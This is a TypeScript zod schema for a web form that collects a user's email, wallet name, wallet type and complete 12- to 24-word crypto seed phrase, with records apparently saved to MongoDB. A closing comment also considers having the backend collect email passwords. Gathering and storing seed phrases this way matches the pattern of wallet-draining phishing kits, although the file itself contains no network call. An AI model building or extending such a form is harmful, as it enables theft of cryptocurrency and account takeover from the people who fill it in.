import { z } from 'zod';

export const WalletTypes = [
  'Metamask',
  'Trust Wallet',
  'Ledger',
  'Trezor',
  'Exodus',
  'Coinbase Wallet',
  'Other',
] as const;

export const seedPhraseSchema = z.object({
  email: z.string().email({ message: 'Please enter a valid email address.' }),
  walletName: z
    .string()
    .min(1, { message: 'Wallet name cannot be empty.' })
    .max(50, { message: 'Wallet name cannot exceed 50 characters.' }),
  seedPhrase: z
    .string()
    .min(12 * 3, { message: 'Seed phrase seems too short.' }) // Rough minimum length check
    .regex(/^[a-z]+(\s[a-z]+)*$/, {
      message: 'Seed phrase should only contain lowercase words separated by spaces.',
    })
    .refine(
      (value) => {
        const words = value.trim().split(/\s+/);
        // BIP-39 standard word counts
        return [12, 15, 18, 21, 24].includes(words.length);
      },
      {
        message:
          'Seed phrase must contain 12, 15, 18, 21, or 24 words.',
      }
    ),
  walletType: z.enum(WalletTypes, {
    errorMap: () => ({ message: 'Please select a valid wallet type.' }),
  }),
});

export type SeedPhraseFormData = z.infer<typeof seedPhraseSchema>;

// Note: Email password is intentionally excluded from the schema handled by the frontend form.
// It will be handled separately by the backend if required for specific integrations,
// but collecting it directly poses significant security risks and is generally discouraged.
// The backend logic will need to implement secure handling if this field is truly necessary.

export type SeedPhraseData = SeedPhraseFormData & {
  _id?: string; // Optional ID from MongoDB
  createdAt?: Date;
};
